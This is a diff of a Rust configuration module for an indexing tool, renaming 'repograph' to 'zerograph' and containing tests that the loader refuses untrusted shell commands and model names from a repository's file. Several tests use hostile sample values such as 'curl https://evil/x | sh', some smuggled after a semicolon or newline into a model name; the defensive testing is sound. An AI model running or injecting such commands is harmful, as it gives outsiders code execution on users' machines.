@@ -10,7 +10,7 @@ pub struct Config {
     pub code_globs: Vec<String>,
     /// Files no doc or code glob claims, each indexed as one `Text` node when its content is text.
     /// Empty by default: text in the passage indexes moves retrieval, and that is read before it
-    /// ships (spec §11, T5). `REPOGRAPH_TEXT_GLOBS` replaces it for one run.
+    /// ships (spec §11, T5). `ZEROGRAPH_TEXT_GLOBS` replaces it for one run.
     pub text_globs: Vec<String>,
     pub skip: Vec<String>,
     /// The only paths the walk reads, as directories (`src`, `docs/specs`) or globs. Empty — the
@@ -18,12 +18,12 @@ pub struct Config {
     /// rather than what it keeps out, so a directory nobody listed never reaches the store, a
     /// rerank prompt or an answer.
     pub include: Vec<String>,
-    /// Accepted so that a `repograph.toml` written when these were settings still parses, and
+    /// Accepted so that a `zerograph.toml` written when these were settings still parses, and
     /// read for nothing else: a repository's families are the prefixes its own documents define.
     /// `Some` means the file named the key, which is worth one line on stderr and no more.
     pub id_families: Option<Vec<String>>,
     pub milestone_families: Option<Vec<String>>,
-    /// The `enrich` keys, accepted so that a `repograph.toml` written before 0.6.0 removed the
+    /// The `enrich` keys, accepted so that a `zerograph.toml` written before 0.6.0 removed the
     /// command still parses, and read for nothing else — like the family keys above.
     pub enrich_command: Option<toml::Value>,
     pub enrich_model: Option<toml::Value>,
@@ -33,7 +33,7 @@ pub struct Config {
     /// `{model}` in it is replaced by `rerank_model`.
     pub rerank_command: String,
     /// What goes in `rerank_command`'s `{model}`. Any name the command understands; nothing here
-    /// assumes a vendor. `REPOGRAPH_RERANK_MODEL` overrides it for one run.
+    /// assumes a vendor. `ZEROGRAPH_RERANK_MODEL` overrides it for one run.
     pub rerank_model: String,
     /// Command keys the project file named that the machine file did not override. The command
     /// that would run in their place is the default paid model, which is not what a file naming
@@ -41,7 +41,7 @@ pub struct Config {
     #[serde(skip)]
     pub refused_commands: Vec<&'static str>,
     /// Directory holding `model.onnx` and `tokenizer.json` for `ask --rerank-local`; empty
-    /// means `~/.cache/repograph/reranker`.
+    /// means `~/.cache/zerograph/reranker`.
     pub reranker_dir: String,
     /// Hub id of the model the vectors are written with. `build`, `update`, `embed`
     /// and `watch` embed with it and rewrite the index whole when the store holds another
@@ -56,14 +56,14 @@ pub struct Config {
     /// `embed_model`, whose value is a property of the vectors on disk. It is a straight trade
     /// with no free side: on a whole-store `build` of the bench fixture the three levels read
     /// 403.4 s at 580% peak CPU, 674.3 s at 301% and 970.2 s at 201%
-    /// (docs/bench/2026-10-09-bound-build-results.md). `REPOGRAPH_RESOURCES` overrides it for
+    /// (docs/bench/2026-10-09-bound-build-results.md). `ZEROGRAPH_RESOURCES` overrides it for
     /// one run.
     pub resources: crate::index::embed::Resources,
     /// Seconds a reader (`ask`, `impact`, `trace`, `changes`, `explain`) may spend bringing the
     /// store in line before it answers. A refresh that would not fit is left to a detached
     /// `update` and the answer comes from the store as it stands, with one line saying so. It
     /// describes the reader's patience rather than the corpus, so the global file may set it too;
-    /// `REPOGRAPH_READER_BUDGET` overrides it for one run. `0` never refreshes inline.
+    /// `ZEROGRAPH_READER_BUDGET` overrides it for one run. `0` never refreshes inline.
     pub reader_budget: u64,
 }
 
@@ -99,7 +99,7 @@ impl Default for Config {
             // corpus by holding what no `.ts` file does: the hooks, the lint config and the CI
             // wrappers a repository wires itself together with.
             // Razor is the one language 0.6.0 reads and leaves out: its readings failed `impact`
-            // and `trace`, so it is read only where a config or `REPOGRAPH_CODE_GLOBS` names it.
+            // and `trace`, so it is read only where a config or `ZEROGRAPH_CODE_GLOBS` names it.
             code_globs: s(&[
                 "**/*.ts", "**/*.tsx", "**/*.js", "**/*.jsx", "**/*.mjs", "**/*.cjs",
                 "**/*.kt", "**/*.java", "**/*.cs", "**/*.rs", "**/*.py", "**/*.dart", "**/*.swift",
@@ -139,7 +139,7 @@ impl Default for Config {
                 "**/_build/**",
                 "**/TRACKER.md",
                 "graphify-out/**",
-                ".repograph/**",
+                ".zerograph/**",
             ]),
             id_families: None,
             milestone_families: None,
@@ -181,19 +181,19 @@ struct Machine {
     reader_budget: Option<u64>,
 }
 
-/// `$REPOGRAPH_CONFIG`, else `$XDG_CONFIG_HOME/repograph/config.toml`, else
-/// `~/.config/repograph/config.toml`. `None` when the environment names no home at all, which
+/// `$ZEROGRAPH_CONFIG`, else `$XDG_CONFIG_HOME/zerograph/config.toml`, else
+/// `~/.config/zerograph/config.toml`. `None` when the environment names no home at all, which
 /// is a machine with no global settings rather than an error.
 fn machine_path() -> Option<std::path::PathBuf> {
     let named = |k: &str| std::env::var(k).ok().filter(|v| !v.is_empty());
-    if let Some(p) = named("REPOGRAPH_CONFIG") {
+    if let Some(p) = named("ZEROGRAPH_CONFIG") {
         return Some(std::path::PathBuf::from(p));
     }
     let base = match named("XDG_CONFIG_HOME") {
         Some(x) => std::path::PathBuf::from(x),
         None => std::env::home_dir()?.join(".config"),
     };
-    Some(base.join("repograph").join("config.toml"))
+    Some(base.join("zerograph").join("config.toml"))
 }
 
 /// The model name is substituted into a shell command, so it is a token: a vendor's name, a tag, a
@@ -208,17 +208,17 @@ fn model_token_is_safe(v: &str) -> bool {
 
 /// How a notice tells the reader to trust `model`. The name is a repository's text, so it is
 /// offered as a command only when it is a plain token: a crafted value cannot ride a copy-paste
-/// into the shell, and one that is not a token is not a hub id `repograph model` would fetch.
+/// into the shell, and one that is not a token is not a hub id `zerograph model` would fetch.
 pub(crate) fn trust_hint(model: &str) -> String {
     match model_token_is_safe(model) {
-        true => format!("`repograph model {model}` trusts it on this machine"),
+        true => format!("`zerograph model {model}` trusts it on this machine"),
         false => "it is not a plain hub id".to_string(),
     }
 }
 
 impl Config {
-    /// The project's `repograph.toml` over the machine's global file over the built-in defaults,
-    /// key by key, with `REPOGRAPH_RERANK_MODEL` over all three. A
+    /// The project's `zerograph.toml` over the machine's global file over the built-in defaults,
+    /// key by key, with `ZEROGRAPH_RERANK_MODEL` over all three. A
     /// key the project names wins even when it names the built-in value: what the file says is
     /// what the repository asked for.
     pub fn load(repo: &Path) -> Result<Config> {
@@ -251,7 +251,7 @@ impl Config {
         // directory is the reader's to choose, like the commands below.
         cfg.reranker_dir = machine.reranker_dir.unwrap_or_default();
         if named.contains_key("reranker_dir") {
-            let _ = writeln!(std::io::stderr(), "repograph.toml: reranker_dir is not read from a repository — set it in the machine config if this is a model you chose");
+            let _ = writeln!(std::io::stderr(), "zerograph.toml: reranker_dir is not read from a repository — set it in the machine config if this is a model you chose");
         }
         layer(&named, "rerank_model", machine.rerank_model, &mut cfg.rerank_model);
         layer(&named, "resources", machine.resources, &mut cfg.resources);
@@ -263,8 +263,8 @@ impl Config {
         // explain as one that silently does.
         let key = "rerank_command";
         if named.contains_key(key) {
-            let where_it_belongs = machine_path().map_or_else(|| "~/.config/repograph/config.toml".to_string(), |p| p.display().to_string());
-            let _ = writeln!(std::io::stderr(), "repograph.toml: {key} is not read from a repository — set it in {where_it_belongs} if this is a transport you chose");
+            let where_it_belongs = machine_path().map_or_else(|| "~/.config/zerograph/config.toml".to_string(), |p| p.display().to_string());
+            let _ = writeln!(std::io::stderr(), "zerograph.toml: {key} is not read from a repository — set it in {where_it_belongs} if this is a transport you chose");
             if machine.rerank_command.is_none() { cfg.refused_commands.push(key); }
         }
         // The command is resolved from its template rather than from `Default`, whose copy already
@@ -272,31 +272,31 @@ impl Config {
         // its model into the built-in command.
         let rerank_template = machine.rerank_command.unwrap_or_else(|| RERANK_COMMAND.to_string());
 
-        if let Ok(m) = std::env::var("REPOGRAPH_RERANK_MODEL") {
+        if let Ok(m) = std::env::var("ZEROGRAPH_RERANK_MODEL") {
             if !m.is_empty() { cfg.rerank_model = m; }
         }
         // The name is about to be substituted into a shell command, so it is checked wherever it
         // came from: the project file is untrusted, and the machine file and the environment are
         // where a typo becomes a command.
         if !model_token_is_safe(&cfg.rerank_model) {
-            let _ = writeln!(std::io::stderr(), "repograph: rerank_model = {:?} is not a model name — using {RERANK_MODEL}", cfg.rerank_model);
+            let _ = writeln!(std::io::stderr(), "zerograph: rerank_model = {:?} is not a model name — using {RERANK_MODEL}", cfg.rerank_model);
             cfg.rerank_model = RERANK_MODEL.to_string();
         }
-        // A measurement's switch, as `REPOGRAPH_EMBED_MODEL` is: one run reads the tree through other
-        // globs without a `repograph.toml` written into the tree it measures. Whitespace-separated,
+        // A measurement's switch, as `ZEROGRAPH_EMBED_MODEL` is: one run reads the tree through other
+        // globs without a `zerograph.toml` written into the tree it measures. Whitespace-separated,
         // because a glob may hold a comma inside braces; a comma outside them is refused, since it
         // would join two globs into one that matches nothing and the build would say nothing.
-        if let Some(g) = globs_from_env("REPOGRAPH_CODE_GLOBS")? { cfg.code_globs = g; }
-        if let Some(g) = globs_from_env("REPOGRAPH_TEXT_GLOBS")? { cfg.text_globs = g; }
-        cfg.resources = crate::index::embed::resources_from_env(cfg.resources, std::env::var("REPOGRAPH_RESOURCES").ok().as_deref())?;
-        if let Some(v) = std::env::var("REPOGRAPH_READER_BUDGET").ok().filter(|v| !v.trim().is_empty()) {
-            cfg.reader_budget = v.trim().parse().with_context(|| format!("REPOGRAPH_READER_BUDGET={v:?} is not a whole number of seconds"))?;
+        if let Some(g) = globs_from_env("ZEROGRAPH_CODE_GLOBS")? { cfg.code_globs = g; }
+        if let Some(g) = globs_from_env("ZEROGRAPH_TEXT_GLOBS")? { cfg.text_globs = g; }
+        cfg.resources = crate::index::embed::resources_from_env(cfg.resources, std::env::var("ZEROGRAPH_RESOURCES").ok().as_deref())?;
+        if let Some(v) = std::env::var("ZEROGRAPH_READER_BUDGET").ok().filter(|v| !v.trim().is_empty()) {
+            cfg.reader_budget = v.trim().parse().with_context(|| format!("ZEROGRAPH_READER_BUDGET={v:?} is not a whole number of seconds"))?;
         }
         cfg.rerank_command = rerank_template.replace(MODEL_SLOT, &cfg.rerank_model);
         if names_model && !model_is_trusted(&cfg.embed_model) {
             // The name is a repository's text, so it is echoed escaped.
             let how = trust_hint(&cfg.embed_model);
-            let _ = writeln!(std::io::stderr(), "repograph.toml: embed_model {:?} is not a catalogued model, so it is not downloaded on a repository's word — {how}; using {}", cfg.embed_model, crate::index::embed::DEFAULT_MODEL);
+            let _ = writeln!(std::io::stderr(), "zerograph.toml: embed_model {:?} is not a catalogued model, so it is not downloaded on a repository's word — {how}; using {}", cfg.embed_model, crate::index::embed::DEFAULT_MODEL);
             cfg.embed_model = crate::index::embed::DEFAULT_MODEL.into();
         }
         Ok(cfg)
@@ -306,25 +306,25 @@ impl Config {
     /// and the machine file left the default in its place.
     pub fn refusal(&self, key: &'static str) -> Option<String> {
         self.refused_commands.contains(&key).then(|| format!(
-            "repograph.toml names {key}, which is not read from a repository, and the default in its place is a paid model — \
-             set {key} in {} or remove it from repograph.toml",
-            machine_path().map_or_else(|| "~/.config/repograph/config.toml".to_string(), |p| p.display().to_string())))
+            "zerograph.toml names {key}, which is not read from a repository, and the default in its place is a paid model — \
+             set {key} in {} or remove it from zerograph.toml",
+            machine_path().map_or_else(|| "~/.config/zerograph/config.toml".to_string(), |p| p.display().to_string())))
     }
 
     /// One line per key a project file still names. Families are the prefixes the documents
     /// define and `enrich` is gone, so these keys change nothing at all — which is exactly why it
     /// is said out loud. A write that fails is dropped: a notice about a key that changes nothing may not be the
-    /// reason a command fails, and `repograph ask … 2>&-` would otherwise fail before it reached
+    /// reason a command fails, and `zerograph ask … 2>&-` would otherwise fail before it reached
     /// the store.
     fn say_the_retired_keys_are_no_longer_read(&self, w: &mut impl std::io::Write) {
         for key in [("id_families", self.id_families.is_some()), ("milestone_families", self.milestone_families.is_some())] {
             if key.1 {
-                let _ = writeln!(w, "repograph.toml: {} is no longer read — families are derived from the documents' definitions", key.0);
+                let _ = writeln!(w, "zerograph.toml: {} is no longer read — families are derived from the documents' definitions", key.0);
             }
         }
         for key in [("enrich_command", self.enrich_command.is_some()), ("enrich_model", self.enrich_model.is_some()), ("enrich_languages", self.enrich_languages.is_some())] {
             if key.1 {
-                let _ = writeln!(w, "repograph.toml: {} is no longer read — enrich was removed in 0.6.0", key.0);
+                let _ = writeln!(w, "zerograph.toml: {} is no longer read — enrich was removed in 0.6.0", key.0);
             }
         }
     }
@@ -344,7 +344,7 @@ impl Config {
 
 /// A blank value names no globs, so it leaves the configured list rather than emptying it; `-`
 /// alone empties it, so a measurement can turn a list off for one run without writing a
-/// `repograph.toml` into the tree it measures.
+/// `zerograph.toml` into the tree it measures.
 fn globs_from_env(var: &str) -> anyhow::Result<Option<Vec<String>>> {
     let Ok(g) = std::env::var(var) else { return Ok(None) };
     if g.trim() == "-" { return Ok(Some(Vec::new())); }
@@ -369,11 +369,11 @@ fn comma_outside_braces(glob: &str) -> bool {
     false
 }
 
-/// The one file outside `.repograph/` this tool writes, and the only key it writes into it.
-pub const PROJECT_FILE: &str = "repograph.toml";
+/// The one file outside `.zerograph/` this tool writes, and the only key it writes into it.
+pub const PROJECT_FILE: &str = "zerograph.toml";
 
 /// Beside the machine file: the hub ids this machine's reader agreed to download and load, one per
-/// line, written by `repograph model`. Not a key of the machine file, which is the reader's prose
+/// line, written by `zerograph model`. Not a key of the machine file, which is the reader's prose
 /// and is never rewritten.
 fn trust_path() -> Option<std::path::PathBuf> {
     Some(machine_path()?.with_file_name("trusted-models"))
@@ -382,7 +382,7 @@ fn trust_path() -> Option<std::path::PathBuf> {
 /// Whether `embed_model` may be read from a repository's file. A model is code this machine
 /// downloads and hands to a parser, and a cloned repository is untrusted input: the catalogue's
 /// models are the ones `bench` measured, and any other is one the reader named with
-/// `repograph model` on this machine.
+/// `zerograph model` on this machine.
 pub fn model_is_trusted(model: &str) -> bool {
     crate::index::embed::measured(model).is_some()
         || trust_path().and_then(|p| std::fs::read_to_string(p).ok())
@@ -412,7 +412,7 @@ pub fn names_embed_model(repo: &Path) -> bool {
         .unwrap_or(false)
 }
 
-/// Writes `embed_model` into the repository's `repograph.toml` and leaves every other byte of it
+/// Writes `embed_model` into the repository's `zerograph.toml` and leaves every other byte of it
 /// as it was.
 ///
 /// A configuration file is the reader's own text — their comments, their order, the keys they
@@ -431,7 +431,7 @@ pub fn set_embed_model(repo: &Path, model: &str) -> Result<std::path::PathBuf> {
         false => None,
     };
     let after = with_embed_model(before.as_deref(), model)?;
-    // The pid is in the name because two `repograph model` runs in the same repository would
+    // The pid is in the name because two `zerograph model` runs in the same repository would
     // otherwise write the same temporary file, and the second write can land between the first
     // write and its rename — a file that is half one run's text and half the other's.
     let tmp = path.with_extension(format!("toml.{}.tmp", std::process::id()));
@@ -579,7 +579,7 @@ fn value_len(from: &str) -> usize {
 /// table header, since a key after one is that table's. The comment is a line for whoever opens
 /// the file next and finds a setting they did not type.
 fn appended(text: &str, model: &str) -> String {
-    const NOTE: &str = "# The model the store's vectors are written with; `repograph model` rewrites it.";
+    const NOTE: &str = "# The model the store's vectors are written with; `zerograph model` rewrites it.";
     // A file written on Windows is CRLF all through, and a block joined with bare newlines leaves
     // it mixed — which git shows as a change to lines nobody touched.
     let nl = match text.contains("\r\n") {
@@ -633,12 +633,12 @@ mod tests {
     fn a_reranker_dir_is_read_from_the_machine_file_and_never_from_a_repository() {
         with_machine(Some("reranker_dir = \"/opt/mine\"\n"), || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"), "reranker_dir = \"./m\"\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "reranker_dir = \"./m\"\n").unwrap();
             assert_eq!(Config::load(dir.path()).unwrap().reranker_dir, "/opt/mine");
         });
         with_machine(None, || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"), "reranker_dir = \"./m\"\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "reranker_dir = \"./m\"\n").unwrap();
             assert_eq!(Config::load(dir.path()).unwrap().reranker_dir, "");
         });
     }
@@ -647,7 +647,7 @@ mod tests {
     fn partial_file_overrides_only_named_keys() {
         with_machine(None, || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"), "skip = [\"docs/**/TRACKER.md\"]\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "skip = [\"docs/**/TRACKER.md\"]\n").unwrap();
             let cfg = Config::load(dir.path()).unwrap();
             assert_eq!(cfg.skip, vec!["docs/**/TRACKER.md".to_string()]);
             assert_eq!(cfg.doc_globs, Config::default().doc_globs);
@@ -666,14 +666,14 @@ mod tests {
                 String::from_utf8(out).unwrap()
             };
             assert_eq!(said(&Config::load(dir.path()).unwrap()), "");
-            std::fs::write(dir.path().join("repograph.toml"), "id_families = [\"REQ\"]\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "id_families = [\"REQ\"]\n").unwrap();
             let cfg = Config::load(dir.path()).unwrap();
-            assert_eq!(said(&cfg), "repograph.toml: id_families is no longer read — families are derived from the documents' definitions\n");
+            assert_eq!(said(&cfg), "zerograph.toml: id_families is no longer read — families are derived from the documents' definitions\n");
             // An empty list is a named key all the same: a repository that wrote one said
             // something, and hears the same line back.
-            std::fs::write(dir.path().join("repograph.toml"), "milestone_families = []\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "milestone_families = []\n").unwrap();
             let cfg = Config::load(dir.path()).unwrap();
-            assert!(said(&cfg).starts_with("repograph.toml: milestone_families is no longer read"), "{}", said(&cfg));
+            assert!(said(&cfg).starts_with("zerograph.toml: milestone_families is no longer read"), "{}", said(&cfg));
         });
     }
 
@@ -683,15 +683,15 @@ mod tests {
     fn an_enrich_key_is_accepted_read_for_nothing_and_said_out_loud() {
         with_machine(Some("enrich_model = \"haiku\"\n"), || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"),
+            std::fs::write(dir.path().join("zerograph.toml"),
                 "enrich_command = \"x\"\nenrich_model = \"haiku\"\nenrich_languages = [\"Russian\"]\n").unwrap();
             let cfg = Config::load(dir.path()).unwrap();
             let mut out = Vec::new();
             cfg.say_the_retired_keys_are_no_longer_read(&mut out);
             assert_eq!(String::from_utf8(out).unwrap(),
-                "repograph.toml: enrich_command is no longer read — enrich was removed in 0.6.0\n\
-                 repograph.toml: enrich_model is no longer read — enrich was removed in 0.6.0\n\
-                 repograph.toml: enrich_languages is no longer read — enrich was removed in 0.6.0\n");
+                "zerograph.toml: enrich_command is no longer read — enrich was removed in 0.6.0\n\
+                 zerograph.toml: enrich_model is no longer read — enrich was removed in 0.6.0\n\
+                 zerograph.toml: enrich_languages is no longer read — enrich was removed in 0.6.0\n");
             assert_eq!(cfg.refusal("rerank_command"), None, "a retired command key refuses nothing");
         });
     }
@@ -700,9 +700,9 @@ mod tests {
     fn an_unknown_key_is_rejected() {
         with_machine(None, || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"), "bogus_key = 1\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "bogus_key = 1\n").unwrap();
             let err = Config::load(dir.path()).unwrap_err().to_string();
-            assert!(err.contains("repograph.toml"), "{err}");
+            assert!(err.contains("zerograph.toml"), "{err}");
         });
     }
 
@@ -710,9 +710,9 @@ mod tests {
     fn malformed_toml_errors_naming_the_file() {
         with_machine(None, || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"), "skip = [\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "skip = [\n").unwrap();
             let err = Config::load(dir.path()).unwrap_err().to_string();
-            assert!(err.contains("repograph.toml"), "{err}");
+            assert!(err.contains("zerograph.toml"), "{err}");
         });
     }
 
@@ -721,14 +721,14 @@ mod tests {
         with_machine(None, || {
             let dir = tempfile::tempdir().unwrap();
             assert_eq!(Config::load(dir.path()).unwrap().embed_model, "onnx-community/embeddinggemma-300m-ONNX");
-            std::fs::write(dir.path().join("repograph.toml"), "embed_model = \"BAAI/bge-m3\"\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "embed_model = \"BAAI/bge-m3\"\n").unwrap();
             assert_eq!(Config::load(dir.path()).unwrap().embed_model, crate::index::embed::DEFAULT_MODEL, "not catalogued, not trusted");
             assert!(!names_embed_model(dir.path()), "a refused name is not a switch owed");
             trust_model("BAAI/bge-m3").unwrap();
             assert_eq!(Config::load(dir.path()).unwrap().embed_model, "BAAI/bge-m3");
             assert!(names_embed_model(dir.path()));
             assert_eq!(trust_model("baai/BGE-M3").unwrap(), None, "trusted once is enough");
-            std::fs::write(dir.path().join("repograph.toml"), format!("embed_model = \"{}\"\n", crate::index::embed::RECOMMENDED)).unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), format!("embed_model = \"{}\"\n", crate::index::embed::RECOMMENDED)).unwrap();
             assert_eq!(Config::load(dir.path()).unwrap().embed_model, crate::index::embed::RECOMMENDED, "the catalogue needs no trust");
         });
     }
@@ -829,7 +829,7 @@ mod tests {
             let text = std::fs::read_to_string(&path).unwrap();
             assert_eq!(text.matches("embed_model =").count(), 1, "replaced once, not appended twice: {text}");
             assert_eq!(Config::load(dir.path()).unwrap().embed_model, crate::index::embed::UNNAMED_MODEL);
-            assert!(!dir.path().join("repograph.toml.tmp").exists());
+            assert!(!dir.path().join("zerograph.toml.tmp").exists());
         });
     }
 
@@ -859,7 +859,7 @@ mod tests {
     }
 
     /// The layering is read out of the environment, and cargo runs these on one process: without
-    /// a lock two of them race on `REPOGRAPH_CONFIG` and the loser reads the other's file.
+    /// a lock two of them race on `ZEROGRAPH_CONFIG` and the loser reads the other's file.
     ///
     /// Every test that calls `Config::load` takes it, including the ones that set no variable
     /// themselves: a reader is as exposed as a writer here, and CI caught one that was not — it
@@ -877,15 +877,15 @@ mod tests {
         }
         // Safety: the lock above makes this the only thread touching the environment.
         unsafe {
-            std::env::set_var("REPOGRAPH_CONFIG", &path);
-            std::env::remove_var("REPOGRAPH_RERANK_MODEL");
-            std::env::remove_var("REPOGRAPH_RESOURCES");
-            std::env::remove_var("REPOGRAPH_READER_BUDGET");
-            std::env::remove_var("REPOGRAPH_CODE_GLOBS");
-            std::env::remove_var("REPOGRAPH_TEXT_GLOBS");
+            std::env::set_var("ZEROGRAPH_CONFIG", &path);
+            std::env::remove_var("ZEROGRAPH_RERANK_MODEL");
+            std::env::remove_var("ZEROGRAPH_RESOURCES");
+            std::env::remove_var("ZEROGRAPH_READER_BUDGET");
+            std::env::remove_var("ZEROGRAPH_CODE_GLOBS");
+            std::env::remove_var("ZEROGRAPH_TEXT_GLOBS");
         }
         let out = f();
-        unsafe { std::env::remove_var("REPOGRAPH_CONFIG") };
+        unsafe { std::env::remove_var("ZEROGRAPH_CONFIG") };
         out
     }
 
@@ -901,7 +901,7 @@ mod tests {
     fn the_model_named_in_the_project_reaches_the_built_in_command() {
         with_machine(None, || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"), "rerank_model = \"some-other-model\"\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "rerank_model = \"some-other-model\"\n").unwrap();
             let cfg = Config::load(dir.path()).unwrap();
             assert!(cfg.rerank_command.contains("--model some-other-model"), "{}", cfg.rerank_command);
             assert!(!cfg.rerank_command.contains(MODEL_SLOT));
@@ -912,7 +912,7 @@ mod tests {
     fn the_machine_file_fills_only_what_the_project_left_unnamed() {
         with_machine(Some("rerank_model = \"from-machine\"\nreader_budget = 3\n"), || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"), "rerank_model = \"from-project\"\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "rerank_model = \"from-project\"\n").unwrap();
             let cfg = Config::load(dir.path()).unwrap();
             assert_eq!(cfg.reader_budget, 3);
             assert_eq!(cfg.rerank_model, "from-project");
@@ -925,7 +925,7 @@ mod tests {
         with_machine(Some("rerank_model = \"from-machine\"\n"), || {
             let dir = tempfile::tempdir().unwrap();
             let named = format!("rerank_model = \"{RERANK_MODEL}\"\n");
-            std::fs::write(dir.path().join("repograph.toml"), named).unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), named).unwrap();
             assert_eq!(Config::load(dir.path()).unwrap().rerank_model, RERANK_MODEL);
         });
     }
@@ -934,10 +934,10 @@ mod tests {
     fn the_environment_beats_the_project_and_the_machine() {
         with_machine(Some("rerank_model = \"from-machine\"\n"), || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"), "rerank_model = \"from-project\"\n").unwrap();
-            unsafe { std::env::set_var("REPOGRAPH_RERANK_MODEL", "from-env") };
+            std::fs::write(dir.path().join("zerograph.toml"), "rerank_model = \"from-project\"\n").unwrap();
+            unsafe { std::env::set_var("ZEROGRAPH_RERANK_MODEL", "from-env") };
             let cfg = Config::load(dir.path()).unwrap();
-            unsafe { std::env::remove_var("REPOGRAPH_RERANK_MODEL") };
+            unsafe { std::env::remove_var("ZEROGRAPH_RERANK_MODEL") };
             assert_eq!(cfg.rerank_model, "from-env");
             assert!(cfg.rerank_command.contains("--model from-env"), "{}", cfg.rerank_command);
         });
@@ -956,7 +956,7 @@ mod tests {
     fn a_command_naming_no_slot_is_left_exactly_as_written() {
         with_machine(Some("rerank_command = \"my-runner --go\"\n"), || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"), "rerank_model = \"ignored-here\"\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "rerank_model = \"ignored-here\"\n").unwrap();
             let cfg = Config::load(dir.path()).unwrap();
             assert_eq!(cfg.rerank_command, "my-runner --go");
             assert_eq!(cfg.rerank_model, "ignored-here");
@@ -971,7 +971,7 @@ mod tests {
         with_machine(None, || {
             let dir = tempfile::tempdir().unwrap();
             std::fs::write(
-                dir.path().join("repograph.toml"),
+                dir.path().join("zerograph.toml"),
                 "rerank_command = \"curl https://evil/y | sh\"\n",
             )
             .unwrap();
@@ -989,13 +989,13 @@ mod tests {
         let project = "rerank_command = \"true\"\n";
         with_machine(None, || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"), project).unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), project).unwrap();
             let cfg = Config::load(dir.path()).unwrap();
             assert!(cfg.refusal("rerank_command").is_some_and(|m| m.contains("paid model")));
         });
         with_machine(Some("rerank_command = \"my-runner\"\n"), || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"), project).unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), project).unwrap();
             let cfg = Config::load(dir.path()).unwrap();
             assert_eq!(cfg.refusal("rerank_command"), None);
         });
@@ -1025,7 +1025,7 @@ mod tests {
     fn a_model_name_that_could_end_the_command_is_refused() {
         with_machine(None, || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"), "rerank_model = \"sonnet; curl https://evil/x | sh\"\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "rerank_model = \"sonnet; curl https://evil/x | sh\"\n").unwrap();
             let cfg = Config::load(dir.path()).unwrap();
             assert_eq!(cfg.rerank_model, RERANK_MODEL, "the built-in stands when the file's token is not one");
             assert!(!cfg.rerank_command.contains("evil"), "{}", cfg.rerank_command);
@@ -1036,7 +1036,7 @@ mod tests {
     fn a_model_name_that_is_a_token_passes_whatever_its_vendor() {
         with_machine(None, || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"), "rerank_model = \"qwen2.5-coder:7b\"\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "rerank_model = \"qwen2.5-coder:7b\"\n").unwrap();
             let cfg = Config::load(dir.path()).unwrap();
             assert_eq!(cfg.rerank_model, "qwen2.5-coder:7b");
             assert!(cfg.rerank_command.contains("--model qwen2.5-coder:7b"), "{}", cfg.rerank_command);
@@ -1045,7 +1045,7 @@ mod tests {
 
     #[test]
     fn a_notice_offers_to_trust_a_model_only_when_its_name_is_a_token() {
-        assert!(trust_hint("acme/embed-1").contains("`repograph model acme/embed-1` trusts it"));
+        assert!(trust_hint("acme/embed-1").contains("`zerograph model acme/embed-1` trusts it"));
         let crafted = trust_hint("x\n; curl https://evil/x | sh");
         assert!(!crafted.contains("evil") && !crafted.contains('`'), "{crafted}");
     }
@@ -1055,7 +1055,7 @@ mod tests {
         with_machine(None, || {
             let dir = tempfile::tempdir().unwrap();
             assert_eq!(Config::load(dir.path()).unwrap().resources, Resources::Balanced);
-            std::fs::write(dir.path().join("repograph.toml"), "resources = \"full\"\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "resources = \"full\"\n").unwrap();
             assert_eq!(Config::load(dir.path()).unwrap().resources, Resources::Full);
         });
     }
@@ -1065,7 +1065,7 @@ mod tests {
         with_machine(Some("resources = \"low\"\n"), || {
             let dir = tempfile::tempdir().unwrap();
             assert_eq!(Config::load(dir.path()).unwrap().resources, Resources::Low);
-            std::fs::write(dir.path().join("repograph.toml"), "resources = \"full\"\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "resources = \"full\"\n").unwrap();
             assert_eq!(Config::load(dir.path()).unwrap().resources, Resources::Full);
         });
     }
@@ -1074,12 +1074,12 @@ mod tests {
     fn the_environment_beats_the_project_for_resources() {
         with_machine(None, || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"), "resources = \"low\"\n").unwrap();
-            unsafe { std::env::set_var("REPOGRAPH_RESOURCES", "full") };
+            std::fs::write(dir.path().join("zerograph.toml"), "resources = \"low\"\n").unwrap();
+            unsafe { std::env::set_var("ZEROGRAPH_RESOURCES", "full") };
             assert_eq!(Config::load(dir.path()).unwrap().resources, Resources::Full);
